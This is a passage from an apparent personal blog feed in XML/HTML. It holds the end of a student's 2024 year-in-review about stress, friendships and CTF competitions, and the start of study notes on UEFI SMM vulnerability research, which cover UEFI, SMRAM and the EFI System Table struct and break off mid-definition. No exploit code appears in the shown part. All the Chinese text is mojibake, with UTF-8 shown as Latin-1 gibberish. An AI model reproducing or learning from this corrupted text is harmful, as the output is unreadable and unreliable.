title="æˆ‘çš„å›¾å›¾å‘¢"><p>åªèƒ½è¯´åœˆåœˆå¬ä¸æ‡‚è¿™è¾¹çš„äººè®²è¯çš„å£éŸ³ï¼Œå»ä¹°ä¸ªç‰›å¥¶é—®å°å–éƒ¨çš„è€æ¿é—®äº†åŠå¤©æ²¡å¬æ‡‚ä»–åœ¨è®²ä»€ä¹ˆğŸ˜¨  </p><h2 id="å…³äºå‹è°Š"><a href="#å…³äºå‹è°Š" class="headerlink" title="å…³äºå‹è°Š"></a>å…³äºå‹è°Š</h2><p>åœˆåœˆä¸€ç›´æŠŠå‹è°Šçœ‹ç€å¾ˆé‡ï¼Œå¯æ˜¯è¿™é‡Œä¸å¾—ä¸è¯´é‚£äº›å¾®ä¿¡ã€QQ å•åˆ çš„äººçœŸçš„å¾ˆå¦äººæ— è¯­å’Œæ„Ÿåˆ°å¹¼ç¨šğŸ˜…ğŸ˜…ğŸ˜…<br>æŸå¤©æ™šä¸Šåœˆåœˆå¿ƒè¡€æ¥æ½®æƒ³çœ‹çœ‹æœ‰å¤šå°‘äººå¾®ä¿¡å•åˆ ä»–ï¼Œç»“æœå‘ç°æœ‰ 10 å¤šäººã€‚åœˆåœˆæƒ³äº†åŠå¤©ï¼Œå’Œä½ ä»¬æ— å†¤æ— ä»‡ï¼Œè€Œä¸”æ›¾ç»æ²¡æœ‰ä»€ä¹ˆè¿‡èŠ‚ï¼Œä½ å•åˆ å°¼ç›å‘¢ï¼Ÿæœ‰äº‹æƒ…ä¸ä¼šæ²Ÿé€šï¼Ÿå¤–è¡¨æˆå¹´å¿ƒç†å°å­¦ç”Ÿï¼ŸğŸ˜…ğŸ˜…ğŸ˜…<br>å¯æ˜¯æ€»çš„æ¥è¯´ï¼Œè¿™ä¸€å¹´è¿˜æ˜¯è®¤è¯†äº†å¾ˆå¤šçš„äººï¼Œäº¤åˆ°äº†å¾ˆå¤šçš„æœ‹å‹  </p><img src="/2024/12/31/2024/53.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><h2 id="ä¸€äº›ä¸å¦‚æ„"><a href="#ä¸€äº›ä¸å¦‚æ„" class="headerlink" title="ä¸€äº›ä¸å¦‚æ„"></a>ä¸€äº›ä¸å¦‚æ„</h2><p>å¦‚æœè¦ç”¨ä¸¤ä¸ªå­—æ¥è¯„ä»· 2024 å¹´ï¼Œåœˆåœˆä¼šè¯´ï¼šéš¾å´©ğŸ˜”ã€‚<br>åœˆåœˆçš„ 2024 å¹´è¿‡çš„å¹¶ä¸å¦‚æ„ï¼ŒåŸºæœ¬æ¯å¤©éƒ½ç”Ÿæ´»åœ¨é«˜å‹çš„ç¯å¢ƒä¸­ï¼ˆè¿™å¹¶ä¸å±€é™äºå­¦ä¹ å’Œæ¯”èµ›æ–¹é¢ï¼‰ï¼Œå‹åŠ›æ—¢æœ‰åˆ«äººç»™çš„ä¹Ÿæœ‰è‡ªå·±ç»™çš„ï¼Œä¸è¿‡æ„Ÿè§‰å¤§éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±ç»™è‡ªå·±åŠ çš„ã€‚åœˆåœˆçš„æƒ…ç»ªç»å¸¸å¾ˆä½è½ï¼Œç‰¹åˆ«æ˜¯ 11 æœˆåº•åˆ°å¹´æœ«è¿™æ®µæ—¶é—´é‡Œç®€ç›´ä½çš„ç¦»è°±ï¼ˆå¯æ˜¯å¹³æ—¶è¿˜æ˜¯å°½åŠ›åœ¨å¤–é¢è¡¨ç°å¾—è‡ªå·±ä¸€åˆ‡æ­£å¸¸ï¼ŒçœŸæ˜¯ä¸ªåŒé¢äººå•ŠğŸ˜‡ï¼‰ï¼Œæœ‰çš„æ—¶å€™å°±æƒ³ç›´æ¥ç¡è§‰ç„¶åä»€ä¹ˆäº‹æƒ…éƒ½ä¸æƒ³å¹²ï¼ˆæåº¦ä½è½çš„æ—¶å€™ä¼šå‘ç°è‡ªå·±å¾ˆå®¹æ˜“å›°ï¼Œæ„Ÿè§‰èƒ½å¤Ÿä¸€æ¬¡æ€§ç¡å¥½å‡ å¤©ï¼‰ã€‚æƒ…ç»ªä½è½æ—¶æœ‰æ—¶ä¼šå»æ‰¾éƒ­é£ã€ç„¦ä½¬ã€eeee èŠå¤©ï¼ˆçœŸçš„æŒºæ„Ÿè°¢ä»–ä»¬ğŸ¥¹ï¼‰ï¼Œå¯æ˜¯æ¯ä¸ªäººç°åœ¨éƒ½å¾ˆå¿™ï¼Œæƒ…ç»ªçš„æ’è§£è¿˜æ˜¯è¦é è‡ªå·±ã€‚ä¸€åˆ°æ™šä¸Šå°±å¾ˆå®¹æ˜“ emoï¼Œåœˆåœˆä»–ä¹Ÿä¸çŸ¥é“ä»–è‡ªå·±åˆ°åº•æ€ä¹ˆäº†ï¼Œæ„Ÿè§‰æ˜¯æ—¶å€™æ‰¾ä¸ªæ—¶é—´æ”¾ä¸‹æ‰€æœ‰äº‹æƒ…å‡ºå»èµ°èµ°æ”¾æ¾ä¸€ä¸‹äº†ï¼Œå¯æƒœä¹Ÿæ‰¾ä¸åˆ°è¿™ä¸ªæ—¶é—´ï¼Œäº‹æƒ…å¤ªå¤šäº†<br>åœ¨åˆä¸­å’Œé«˜ä¸­å“¦çš„æ—¶å€™åœˆåœˆæœ‰å¾ˆå¤šçš„å¥½å‹ï¼Œæ¯åˆ°å¯’æš‘å‡åŸºæœ¬æ¯å¤©éƒ½èƒ½ä¸€èµ·å‡ºå»åƒæ—©é¤ç„¶åä¸€èµ·å¤œéª‘ï¼Œå¯æ˜¯ç°åœ¨æ¯ä¸ªäººéƒ½è¦å¿™è‡ªå·±çš„äº‹æƒ…ï¼Œå¯’æš‘å‡èƒ½å¤Ÿè§ä¸€é¢å·²ç»å˜å¾—ååˆ†çš„å¥¢ä¾ˆğŸ˜”ğŸ˜”  </p><p>æœ‰ä¸€äº›è¯åœˆåœˆå¬äº†æ— æ•°éï¼šä¼šæ¥çš„ã€ä¼šæˆçš„ã€ä¼šâ€¦â€¦ã€‚å¯æ˜¯è¿‡äº†è¿™ä¹ˆä¹…ï¼Œä¹Ÿæ²¡è§åˆ°è¿‡è¿™ä¸ªâ€œä¼šâ€çš„å‡ºç°ï¼Œä¸Šæ¬¡é‚£ä¸ªâ€œä¼šèµ¢çš„â€å·²ç»å˜æˆ 2.5 äº†ğŸ¤¡ã€‚  </p><p>å¾ˆå¤šæ—¶å€™åœˆåœˆéƒ½åœ¨å°½åŠ›çš„è¯´æœè‡ªå·±ï¼Œæœ‰çš„äº‹æƒ…è¯´æœäº†ï¼Œæƒ³é€šäº†ï¼Œçœ‹å¼€äº†ï¼Œå¯è¿˜æ˜¯éå¸¸çš„éš¾å—ã€‚  </p><p>è¿˜åˆšä¸Šå¤§å­¦çš„æ—¶å€™åœˆåœˆå……æ»¡æ´»åŠ›ï¼Œæƒ³è¦æ‹¿å¾ˆå¤šå¥–ï¼Œæƒ³è¦å¾ˆé«˜çš„ç»©ç‚¹ï¼Œæƒ³è¦ä¿ç ”ä»€ä¹ˆçš„ï¼Œå¯æ˜¯ä¸çŸ¥ä¸è§‰çš„åœˆåœˆé€æ¸å¤±å»äº†åŠ¨åŠ›ï¼Œè™½ç„¶è„šæ­¥ä¸€ç›´éƒ½æ²¡æœ‰åœä¸‹æ¥ï¼Œä½†å·²ç»å¤±å»äº†å½“æ—¶çƒ­æƒ…å’ŒåŠ¨åŠ›ï¼Œæ€»æ„Ÿè§‰å¥–æ‹¿ä¸æ‹¿éƒ½æ— æ‰€è°“äº†ï¼Œé™¤äº†è¯»ç ”å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆç†æƒ³å’Œç›®æ ‡ï¼Œå°±åƒæ˜¯ä¸€ä¸ªå‚€å„¡ä¸€æ ·æ—¥å¤ä¸€æ—¥å¹²ç€è‡ªå·±è¯´æœè‡ªå·±è§‰å¾—å¾ˆé‡è¦çš„äº‹æƒ…ğŸ˜”ã€‚  </p><p>è¿˜è®°å¾— 12 æœˆ 21 å·é‚£å¤©åœˆåœˆå½»åº•ç ´é˜²äº†ï¼Œæƒ…ç»ªä½è½åˆ°æ— æ³•å¿å—ï¼Œäºæ˜¯ä»–æ”¾ä¸‹äº†èº«è¾¹çš„æ‰€æœ‰äº‹æƒ…ï¼Œæ‰“ç®—ä¸€ä¸ªäººå‡ºå»èµ°èµ°ğŸ˜­<br>å‡ºæ ¡é—¨çš„æ—¶å€™å¤©è¿˜æ˜¯äº®çš„ï¼š  </p><img src="/2024/12/31/2024/46.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>èµ°ç€èµ°ç€å¤©å°±ä¸çŸ¥ä¸è§‰çš„å˜æš—äº†ã€‚è·¯è¿‡åºŸå¼ƒçš„é“è·¯ï¼š  </p><img src="/2024/12/31/2024/47.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ååˆ†å®‰é™çš„è¡—é“ï¼š  </p><img src="/2024/12/31/2024/48.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ„Ÿè§‰è¿™é‡Œæ™¯è‰²æŒºä¸é”™çš„ :)  </p><img src="/2024/12/31/2024/49.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>èµ°äº†åŠå¤©åå¿ƒé‡Œæ²¡é‚£ä¹ˆéš¾å—äº†ï¼Œåˆšå¥½éƒ­é£è·¯è¿‡åå¸ˆé¡ºä¾¿ç»™åœˆåœˆå¸¦äº†ä¸€ä»½é…¸å¥¶ï¼Œç„¶ååœˆåœˆå’Œéƒ­é£å–äº†ç‚¹çƒ§é…’ï¼ˆé›ªç¢§+çƒ§é…’ï¼‰åå°±å›å»äº†  </p><img src="/2024/12/31/2024/50.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å›åˆ°å®¿èˆæœ‰ç‚¹å¤´æ™•ï¼Œéå€’å¤´å°±ç¡äº†ğŸ˜‡<br>æŒºæ„Ÿè°¢é‚£å¤©æœ‰å¾ˆå¤šäººåœ¨é¼“åŠ±åœˆåœˆï¼Œè®©ä»–æœ‰äº†ç»§ç»­å¥‹æ–—ä¸‹å»çš„åŠ¨åŠ›ğŸ¥¹  </p><img src="/2024/12/31/2024/52.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åœˆåœˆåœ¨ 11.30 å¼€å§‹å†³å®šè¦åšå‡ºç‚¹æ”¹å˜ï¼Œåˆ°åº•æ˜¯ä»€ä¹ˆè®©åœˆåœˆè¦åšå‡ºè¿™ä¸ªå†³å®šä»¥åŠå‘ç”Ÿäº†ä»€ä¹ˆæ”¹å˜ï¼ˆç»†å¿ƒçš„äººå¯èƒ½ä¼šå‘ç°é‚£æ®µæ—¶é—´å¼€å§‹åœˆåœˆç¡®å®å’Œä»¥å‰å˜çš„æœ‰ä¸€ç‚¹ä¸ä¸€æ ·äº†ï¼‰ï¼Œæœ‰æœºä¼šå†è¯´å§â€¦â€¦  </p><p>åœˆåœˆè§‰å¾—å†ç»§ç»­è¿™æ ·ä¸‹å»å°±çœŸè¦å®Œè›‹äº†ï¼Œæ‰€ä»¥ä»–æ‰“ç®—è€ƒå®ŒæœŸæœ«åè¦æ‰¾ä¸ªæ—¶é—´å½»åº•æ”¾ç©ºå¤§è„‘ï¼ŒæŠ›å¼ƒå„ç§å±äº‹ï¼Œè¿œç¦»å‹åŠ›å¥½å¥½æ”¾æ¾ä¸€ä¸‹ï¼Œç„¶åå†è®¤çœŸæ€è€ƒè‡ªå·±åˆ°åº•æƒ³è¦ä»€ä¹ˆï¼Œé‡æ–°æ ‘ç«‹ç›®æ ‡ï¼Œæœ€åå·åœŸé‡å½’æ¥ğŸ‘ŠğŸ‘ŠğŸ‘Š  </p><h2 id="ä¸€äº›æƒ³è¯´çš„è¯"><a href="#ä¸€äº›æƒ³è¯´çš„è¯" class="headerlink" title="ä¸€äº›æƒ³è¯´çš„è¯"></a>ä¸€äº›æƒ³è¯´çš„è¯</h2><p>åœ¨è¿™ä¸€å¹´é‡Œï¼Œåœˆåœˆå¾ˆæ„Ÿè°¢å®¶äººçš„æ”¯æŒå’Œå…³çˆ±ï¼Œæ²¡æœ‰ä»–ä»¬åœˆåœˆæ— æ³•èµ°åˆ°ä»Šå¤©ï¼›æ„Ÿè°¢ Csome å¸ˆå…„çš„æŒ‡å¯¼ï¼Œè®©åœˆåœˆèƒ½åœ¨å­¦ä¹ è·¯ä¸Šå°‘èµ°å¾ˆå¤šå¼¯è·¯ï¼›æ„Ÿè°¢ xtxã€korey0sh1ã€sekiro å¸ˆå‚…åœ¨æ¯”èµ›ä¸­ä¸åœˆåœˆä¸€èµ·å¯¹æŠ— pwn é¢˜ã€æ„Ÿè°¢ eeeeã€unknownã€éƒ­é£ã€é»‘ç„¦ä½¬ã€pazuris ã€saofeia åœ¨åœˆåœˆæ— èŠå’Œ emo æ—¶é™ªä»–èŠå¤©ã€æ„Ÿè°¢æ ‡å“¥å¸¦åœˆåœˆå¾æˆ˜æ•°å­¦å»ºæ¨¡æ¯”èµ›ã€æ„Ÿè°¢å®¤å‹çš„ä¸‰è¾†ç”µåŠ¨è½¦è®©åœˆåœˆè§£æ”¾åŒè„šğŸ˜‹ï¼›æ„Ÿè°¢ Sloth çš„å¤§å“¥ä»¬å¸¦åœˆåœˆæ‰“è¿›å›½å†… CTF èµ›äº‹çš„çº¿ä¸‹èµ›ï¼›æ„Ÿè°¢ V&amp;N çš„å‡ºç°è®©åœˆåœˆåº¦è¿‡äº†ä½è°·å’Œç“¶é¢ˆæœŸï¼›æ„Ÿè°¢é¾™å“¥ç»™äºˆçš„çº¿ä¸‹èµ›æœºä¼šï¼ˆå¯æ˜¯æ²¡æ‰“å¥½å‘œå‘œå‘œğŸ˜­ï¼‰ï¼›æ„Ÿè°¢ W&amp;M çš„å¤§å“¥ä»¬æ¯”èµ›å¸¦åœˆåœˆé£ï¼›æ„Ÿè°¢ S1uM4i ç»™äºˆçš„å…³çˆ±ï¼ˆèƒ½è®©åœˆåœˆæ°´ç¾¤ğŸ¥¹ï¼‰ï¼›ä»¥åŠæ„Ÿè°¢å±å¹•å‰çš„ä½ æŠ½å‡ºæ—¶é—´è¯»å®Œåœˆåœˆçš„ç¢ç¢å¿µâ€¦â€¦  </p><h2 id="å¯¹äºæ–°çš„ä¸€å¹´"><a href="#å¯¹äºæ–°çš„ä¸€å¹´" class="headerlink" title="å¯¹äºæ–°çš„ä¸€å¹´"></a>å¯¹äºæ–°çš„ä¸€å¹´</h2><p>æ–°çš„ä¸€å¹´æ„Ÿè§‰å°±æ˜¯è€ƒç ”å§ï¼ˆè€ƒå“ªï¼Ÿiieï¼ŸåŒ—é‚®ï¼ŸWHUï¼Ÿç•™ç»™æ—¶é—´å»åšé€‰æ‹©å§ï¼‰ï¼Œå…¶å®ä¹ŸæŒºéš¾å—çš„ï¼Œæ²¡æƒ³åˆ°è¿˜è¦å†æ¬¡å›é«˜ä¸‰çš„çŠ¶æ€å»å‡†å¤‡åº”è¯•è€ƒè¯•ã€‚åœˆåœˆæœ‰æ—¶å€™æŒºç¾¡æ…•é‚£äº›èƒ½å¤Ÿç¨³å®šä¿å¤–æ ¡é‚£äº›äººï¼Œä»–ä»¬èƒ½åœ¨åœˆåœˆè€ƒç ”çš„æ—¶é—´é‡Œå­¦æ›´å¤šæœ‰ç”¨æ›´åŠ ç¬¦åˆå®é™…çš„ä¸œè¥¿ã€‚åœˆåœˆåœ¨æ–°çš„ä¸€å¹´é‡Œè¿˜ä¼šæœ‰æœºä¼šå‚åŠ æ¯”èµ›å˜›ğŸ¥¹ï¼Œä»–çœŸçš„å¾ˆäº«å—åœ¨èµ›åœºä¸­æˆ˜æ–—çš„æ„Ÿè§‰ğŸ¥¹  </p><p>ä¸Šé¢æ˜¯åœˆåœˆè¿™å‡ å¹´æœ€æƒ³å®Œæˆçš„äº‹æƒ…ï¼ˆè¿›åº¦ä¼šåŒæ­¥åˆ°åšå®¢çš„ about é‡Œï¼‰ï¼ŒçŒœçŒœä»– 2025 å¹´èƒ½å®Œæˆå‡ ä¸ªğŸ˜‡ï¼ˆæœ€å°‘ä¹Ÿè¦å®ç°ä¸€ä»¶äº‹æƒ…å§ğŸ¥¹ï¼‰<br>å†™åˆ°æœ€åä¹Ÿå‘ç°æ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼ˆè¿™ä¸ªæ—¶å€™æ­Œåˆšå¥½æ’­æ”¾åˆ° Head In The Cloudsï¼Œå›å¿†çœŸæ˜¯ä¼šä»¤äººä¼¤æ„Ÿï¼Œä¸çŸ¥ä¸è§‰çœ¼çœ¶å·²ç»æ¹¿æ¶¦ï¼‰ï¼Œæ„Ÿè§‰è¿˜æ˜¯è¦å¯¹æœªæ¥å……æ»¡å¸Œæœ›ï¼Œç›¸ä¿¡ä¸€åˆ‡éƒ½ä¼šå˜å¾—è¶Šæ¥è¶Šå¥½ï¼Œæ„¿ä¸€åˆ‡èƒ½å¤Ÿå¦‚æœŸè€Œè‡³å§ :)  </p><img src="/2024/12/31/2024/24.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¼šèµ¢å˜›ï¼Ÿ  </p><img src="/2024/12/31/2024/25.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UEFI SMM æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</title>
      <link href="/2024/12/14/uefi/"/>
      <url>/2024/12/14/uefi/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>å†…æ ¸å­¦ä¸ä¸‹å»äº†ï¼Œphp å’Œ v8 ç ”ç©¶äº†æŒºé•¿æ—¶é—´ä¹Ÿæ²¡ææ‡‚ï¼Œç„¶åæƒ³èµ·äº†ç¬¬ä¸€æ¬¡å‚åŠ åä¸º hws æ—¶è®²çš„å°±æ˜¯ UEFI å®‰å…¨ã€‚å½“æ—¶è¿˜æ˜¯ä¸ª crypto + misc æ‰‹ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å¬æ‡‚ï¼Œæ‰€ä»¥æ‰“ç®—åœ¨è€ƒç ”å‰å†é‡æ–°å­¦ä¹ ä¸€éï¼ŒåŒæ—¶ä¹Ÿå½“ä½œæ˜¯å¾æˆ˜ RealWorld CTF çš„ç¬¬ä¸€æ­¥æŠŠï¼ˆç¬‘<br>è®©æˆ‘æ„Ÿåˆ°åº†å¹¸çš„æ˜¯ç½‘ä¸Šè®²çš„æ¯”è¾ƒå¥½çš„æ–‡ç« è¿˜æŒºå¤šï¼Œè®©æˆ‘å°‘èµ°å¾ˆå¤šçš„å¼¯è·¯ï¼Œè¿™ç¯‡åšå®¢å¯ä»¥å½“ä½œæ˜¯æˆ‘çš„å­¦ä¹ ç¬”è®°ã€‚  </p><h2 id="UEFI-SMM-å¸¸è§æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨æ€è·¯"><a href="#UEFI-SMM-å¸¸è§æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨æ€è·¯" class="headerlink" title="UEFI SMM å¸¸è§æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨æ€è·¯"></a>UEFI SMM å¸¸è§æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨æ€è·¯</h2><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>æ—¢ç„¶è¯´åˆ° UEFI å›ºä»¶æ¼æ´æŒ–æ˜ï¼Œé‚£è‚¯å®šè¦å…ˆçŸ¥é“ UEFI æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œä¸‹é¢çš„ä»‹ç»æ¥è‡ªäºç½‘ç»œï¼š</p><blockquote><p>UEFIæ˜¯è‹±æ–‡Unified Extensible Firmware Interface çš„ç¼©å†™ï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯â€œç»Ÿä¸€å¯æ‹“å±•å›ºä»¶æ¥å£â€ã€‚å®ƒæ˜¯ä¸€ç§æ–°ä¸€ä»£çš„å›ºä»¶æ¥å£æ ‡å‡†ï¼Œå–ä»£äº†ä¼ ç»Ÿçš„ BIOSï¼ˆBasic Input&#x2F;Output Systemï¼‰æ ‡å‡†ã€‚<br>åœ¨è®¡ç®—æœºå¯åŠ¨æ—¶åˆå§‹åŒ–ç¡¬ä»¶è®¾å¤‡ã€æ£€æµ‹ç³»ç»Ÿé…ç½®ã€åŠ è½½æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºç­‰ã€‚ä¸ä¼ ç»Ÿçš„ BIOS ç›¸æ¯”ï¼ŒUEFI å…·æœ‰æ›´å¤šçš„åŠŸèƒ½å’Œä¼˜åŠ¿ï¼Œå¦‚æ”¯æŒæ›´å¤§çš„ç¡¬ç›˜å®¹é‡ã€æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦ã€æ›´å¤šçš„å®‰å…¨åŠŸèƒ½ã€æ›´å¥½çš„å›¾å½¢ç•Œé¢ç­‰ã€‚ </p></blockquote><p>ç®€å•çš„æ¥è¯´ï¼Œå°±æ˜¯ç”µè„‘å¼€æœºæ—¶ç”¨æ¥å¯åŠ¨æ“ä½œç³»ç»Ÿçš„ç¨‹åºã€‚ï¼ˆæ„Ÿè§‰è¿™ä¸ªè¯´æ³•æœ‰ç‚¹é—®é¢˜ï¼‰<br>UEFI å­˜åœ¨çš„ç›®çš„å°±æ˜¯ä¸ºå¼€å‘è€…åˆ›é€ ä¸€ä¸ªç»Ÿä¸€ï¼Œä¾¿æ·çš„å¯åŠ¨ç¯å¢ƒã€‚<br>UEFI ä¼šåœ¨è®¡ç®—æœºå¯åŠ¨é˜¶æ®µä¸è¿è¡Œé˜¶æ®µæä¾›å¾ˆä¸°å¯Œçš„æœåŠ¡æ¥ä¾›å¼€å‘è€…è°ƒç”¨ã€‚ </p><img src="/2024/12/14/uefi/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">   <p>EDK2å…¨ç§°æ˜¯EFI Development Kit IIï¼Œæ˜¯ç¬¬äºŒä»£ UEFI çš„å®˜æ–¹å¼€å‘åº“ã€‚å¦‚æœæŠŠå…¨ç§°æ‰“å‡ºæ¥ï¼Œå°±æ˜¯ Extended Firmware Interface Development Kit IIã€‚EDK2 æ˜¯ UEFI æ ‡å‡†çš„ä¸€ä»½å®ç°æºç ã€‚  </p><p>SSM æ˜¯ç³»ç»Ÿç®¡ç†æ¨¡å¼ System Management mode çš„ç¼©å†™ï¼Œæ˜¯ Intel åœ¨ 80386SL ä¹‹åå¼•å…¥ x86 ä½“ç³»ç»“æ„çš„ä¸€ç§ CPU çš„æ‰§è¡Œæ¨¡å¼ã€‚ç³»ç»Ÿç®¡ç†æ¨¡å¼åªèƒ½é€šè¿‡ç³»ç»Ÿç®¡ç†ä¸­æ–­ï¼ˆSystem Management Interrupt, SMIï¼‰è¿›å…¥ï¼Œå¹¶åªèƒ½é€šè¿‡æ‰§è¡Œ RSM æŒ‡ä»¤é€€å‡ºã€‚åœ¨ SMM æ¨¡å¼ä¸‹ä¸€åˆ‡è¢«éƒ½å±è”½ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„ä¸­æ–­ã€‚SMM æ¨¡å¼ä¸‹çš„æ‰§è¡Œçš„ç¨‹åºè¢«ç§°ä½œ SMM å¤„ç†ç¨‹åºï¼Œæ‰€æœ‰çš„ SMM å¤„ç†ç¨‹åºåªèƒ½åœ¨ç§°ä½œç³»ç»Ÿç®¡ç†å†…å­˜ï¼ˆSystem Management RAM,SMRAMï¼‰çš„ç©ºé—´å†…è¿è¡Œã€‚å¯ä»¥é€šè¿‡è®¾ç½® SMBASE çš„å¯„å­˜å™¨æ¥è®¾ç½® SMRAM çš„ç©ºé—´ã€‚<br>SMM æ‹¥æœ‰è‡ªå·±çš„å­˜å‚¨ç©ºé—´ï¼Œç§°ä¸º SMRAMï¼Œå¯ä»¥é˜²æ­¢å…¶ä»–æ¨¡å¼å¯¹å…¶è¿›è¡Œè®¿é—®ã€‚<br>SMM çš„å¤„ç†ç¨‹åºåªèƒ½åœ¨ SMRAM é‡Œé¢è¿è¡Œï¼Œæ‰€ä»¥äº†è§£ SMRAM çš„ç»“æ„éå¸¸é‡è¦ã€‚è¿™æ˜¯å‡ºäºå®‰å…¨çš„è€ƒè™‘ï¼Œæ¯•ç«Ÿ SMM æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œå¦‚æœåœ¨å“ªå„¿éƒ½å¯ä»¥è¿è¡Œï¼Œé‚£ä¹ˆå…¶å®ƒçš„ç¨‹åºæ”¹åŠ¨äº†å†…å­˜é‡Œçš„ä¸€ç‚¹ä¸œè¥¿ï¼Œä¹Ÿä¼šå½±å“åˆ° SMMï¼Œå¦‚æœè¿™ä¸ªæ”¹åŠ¨æ˜¯æ¶æ„çš„ï¼Œé‚£åæœå°±ä¸å ªè®¾æƒ³ã€‚<br>ç»“æ„å›¾å¦‚ä¸‹ï¼š  </p><img src="/2024/12/14/uefi/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>SMRAM çš„å¤§å°ä¸æ˜¯æ— é™å¤§çš„ï¼Œå®ƒæœ€åˆåªæœ‰ 64KBï¼Œå…¶èµ·å§‹åœ°å€æ˜¯ SMBASE ï¼ˆè¿™ä¸ªå€¼ä¿å­˜åœ¨ä¸€ä¸ªä¸“é—¨çš„å¯„å­˜å™¨ä¸­ï¼‰ï¼Œåœ¨ SMBASE+0x8000H å¤„å¼€å§‹å­˜æ”¾çš„æ˜¯ SMI çš„ä¸­æ–­å¤„ç†ç¨‹åºã€‚è€Œåœ¨ SMRAM çš„é«˜åœ°å€å¤„å­˜æ”¾ç€å¤„ç†å™¨è¿›å…¥ SMM æ—¶çš„çŠ¶æ€ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯åœ¨å¤„ç†å™¨é€€å‡º SMM æ—¶ä¼šè¢«æ¢å¤åˆ°å¤„ç†å™¨ä¸­ã€‚  </p><p>ç³»ç»Ÿè¡¨ï¼ˆSystemTableï¼‰æ˜¯ edk2 æä¾›çš„ä¸€ä¸ªæœ€é‡è¦ä¹Ÿæ˜¯æœ€åŸºç¡€çš„æ•°æ®ç»“æ„ä¹‹ä¸€ï¼Œå®ƒæ˜¯æ²Ÿé€šå†…æ ¸å’Œåº”ç”¨&#x2F;é©±åŠ¨çš„æ¡¥æ¢ã€‚é€šè¿‡ç³»ç»Ÿè¡¨ï¼Œåº”ç”¨ç¨‹åºå’Œé©±åŠ¨æ‰èƒ½å¤Ÿè®¿é—®åˆ°å†…æ ¸å’Œç¡¬ä»¶èµ„æºã€‚ç³»ç»Ÿè¡¨åŒ…å«äº†å¦‚ä¸‹ä¿¡æ¯ï¼š  </p><ul><li>è¡¨å¤´</li><li>å›ºä»¶ä¿¡æ¯</li><li>æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼Œæ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºè®¾å¤‡</li><li>å¯åŠ¨æœåŠ¡è¡¨</li><li>è¿è¡Œæ—¶æœåŠ¡è¡¨</li><li>ç³»ç»Ÿé…ç½®è¡¨</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">CHAR16 *                   FirmwareVendor;       <span class="comment">/*    24     8 */</span></span><br><span class="line">UINT32                     FirmwareRevision;     <span class="comment">/*    32     4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XXX 4 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">EFI_HANDLE                 ConsoleInHandle;      <span class="comment">/*    40     8 */</span></span><br><span class="line">EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;          <span class="comment">/*    48     8 */</span></span><br><span class="line">EFI_HANDLE                 ConsoleOutHandle;     <span class="comment">/*    56     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut;        <span class="comment">/*    64     8 */</span></span><br><span class="line">EFI_HANDLE                 StandardErrorHandle;  <span class="comment">/*    72     8 */</span></span><br><span class="line">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr;        <span class="comment">/*    80     8 */</span></span><br><span class="line">EFI_RUNTIME_SERVICES *     RuntimeServices;      <span class="comment">/*    88     8 */</span></span><br><span class="line">EFI_BOOT_SERVICES *        BootServices;         <span class="comment">/*    96     8 */</span></span><br><span class="line">UINTN                      NumberOfTableEntries; <span class="comment">/*   104     8 */</span></span><br><span class="line">EFI_CONFIGURATION_TABLE *  ConfigurationTable;   <span class="comment">/*   112     8 